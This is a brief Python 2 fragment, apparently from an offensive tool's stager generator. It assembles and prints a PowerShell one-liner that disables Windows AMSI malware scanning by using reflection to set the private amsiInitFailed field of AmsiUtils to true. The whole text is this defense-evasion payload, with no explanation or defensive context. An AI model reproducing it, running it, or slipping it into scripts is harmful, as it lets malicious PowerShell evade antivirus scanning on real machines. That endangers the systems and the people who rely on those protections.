stager = "$Ref=[Ref].Assembly.GetType("
stager += "'System.Management.Automation.AmsiUtils'"
stager += ');$Ref.GetField('
stager += "'amsiInitFailed','NonPublic,Static'"
stager += ").SetValue($null,$true);"
stager += "};"

print stager